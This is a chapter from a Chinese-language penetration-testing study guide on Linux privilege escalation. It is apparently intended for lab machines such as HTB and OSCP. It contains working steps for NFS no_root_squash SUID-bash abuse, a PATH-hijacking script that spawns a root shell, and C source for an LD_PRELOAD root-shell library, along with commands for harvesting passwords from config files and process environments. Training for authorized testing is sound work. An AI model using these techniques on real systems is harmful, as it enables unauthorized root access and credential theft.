# Ch 23 — NFS / PATH 劫持 / 環境變數

> 目標：掌握三個進階提權技術：NFS root squash 設定錯誤、PATH 環境變數劫持、環境變數洩漏。

## NFS 提權（no_root_squash）

NFS（Network File System）讓你能掛載遠端檔案系統。如果設定了 `no_root_squash`，本地的 root 就等於 NFS 上的 root。

### 確認 NFS 設定

```bash
# 在靶機上
cat /etc/exports

# 輸出範例：
/home/share 10.0.0.0/24(rw,sync,no_root_squash)
#                         ^^^^^^^^^^^^^^^^^^
#                         no_root_squash = 本地 root = 遠端 root
```

`no_root_squash` 和 `no_all_squash` 都是危險設定。

### 利用步驟

**在 Kali（攻擊機）操作：**

```bash
# 1. 確認靶機有哪些 NFS 掛載點
showmount -e 10.10.10.x

# 2. 掛載 NFS share
mkdir /mnt/nfs
mount -t nfs 10.10.10.x:/home/share /mnt/nfs -o nolock

# 3. 在掛載的目錄裡放一個 SUID bash
cp /bin/bash /mnt/nfs/bash_suid
chmod +s /mnt/nfs/bash_suid   # 在 Kali 你是 root，可以設 SUID

# 4. 在靶機上執行
/home/share/bash_suid -p
# -p 保留 SUID 身份
id    # 應該顯示 euid=0(root)
```

### 為什麼這個有效

你在 Kali 以 root 身份在 NFS 上建了 SUID bash。因為 `no_root_squash`，靶機的 root 和 Kali 的 root 是同一個。靶機上執行這個 bash 時，它的 owner 是 root，又有 SUID，所以執行者自動以 root 身份跑。

## PATH 環境變數劫持

當 SUID binary 或 sudo 程式呼叫其他程式時，如果用相對路徑（沒有完整 `/usr/bin/ls`），就會查 PATH。你可以在 PATH 裡插入一個你控制的目錄，放一個同名的惡意程式。

### 找可利用的情況

```bash
# 用 strings 看 SUID binary 呼叫了什麼
strings /usr/local/bin/suid_binary

# 輸出範例：
# ...
# service apache2 start    ← 用了相對路徑 service
# ...
```

或者用 strace 追蹤：

```bash
strace /usr/local/bin/suid_binary 2>&1 | grep "exec\|open"
```

### 利用步驟

```bash
# 假設 SUID binary 呼叫了 service（沒有完整路徑）

# 1. 建立惡意的 service 腳本
echo '#!/bin/bash' > /tmp/service
echo '/bin/bash -p' >> /tmp/service
chmod +x /tmp/service

# 2. 把 /tmp 加到 PATH 的最前面
export PATH=/tmp:$PATH

# 3. 執行 SUID binary，它會找 /tmp/service 而不是真正的 service
/usr/local/bin/suid_binary

# 成功的話你會得到 root shell
```

### 完整 PATH 劫持腳本

```bash
# 建立 /tmp/service
cat > /tmp/service << 'EOF'
#!/bin/bash
/bin/bash -p
EOF
chmod +x /tmp/service

# 修改 PATH
export PATH=/tmp:$PATH

# 觸發
/usr/local/bin/vulnerable_suid_binary
```

## 環境變數

### 找設定檔裡的密碼

```bash
# Web 應用設定
cat /var/www/html/*.php | grep -i "password\|pass\|db_"
cat /var/www/html/config.php

# 常見設定檔路徑
/etc/environment
~/.profile
~/.bashrc
~/.bash_profile
/etc/profile.d/*.sh
```

### proc/self/environ

```bash
# 看當前程序的環境變數
cat /proc/self/environ | tr '\0' '\n'

# 找其他程序的環境變數（如果能讀）
cat /proc/$(pgrep mysql)/environ | tr '\0' '\n'
```

### LD_PRELOAD 劫持（需要 sudo 時保留環境變數）

如果 `sudo -l` 顯示：

```
env_keep+=LD_PRELOAD
```

表示 sudo 執行時保留 LD_PRELOAD 環境變數。

```c
// 建立 /tmp/evil.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
```

```bash
# 編譯成共享庫
gcc -fPIC -shared -nostartfiles -o /tmp/evil.so /tmp/evil.c

# 用 LD_PRELOAD 執行任何 sudo 允許的程式
sudo LD_PRELOAD=/tmp/evil.so /usr/bin/vim
# evil.so 的 _init 先執行，取得 root shell
```

## 其他進階技術

### Writable /etc/ld.so.conf.d/

```bash
ls -la /etc/ld.so.conf.d/
# 如果可寫，可以加入惡意 library 路徑
```

### /usr/lib 或 /lib 有可寫的 shared library

```bash
# 如果 /usr/lib/libsomething.so 可寫，且被 root 程序載入
ldd /usr/local/bin/suid_binary    # 看它用了哪些 library
ls -la /usr/lib/libXXX.so         # 確認權限
```

## 本章對應靶機

| 機器 | 技術 |
|------|-----|
| THM NFS | NFS no_root_squash |
| HTB Tenten | PATH hijacking |
| OSCP Lab（OffSec） | 多種提權的組合 |

## 自我檢核

- [ ] 能說出 NFS `no_root_squash` 提權的 4 個步驟
- [ ] 能寫出 PATH 劫持的流程（修改 PATH → 放假腳本 → 執行 SUID）
- [ ] 知道 `sudo -l` 中 `env_keep+=LD_PRELOAD` 意味著什麼
- [ ] 能用 strings 或 strace 看 SUID binary 呼叫了什麼

→ [Ch 24 linPEAS / linux-smart-enumeration 解讀](./24-linux-enum-tools.md)
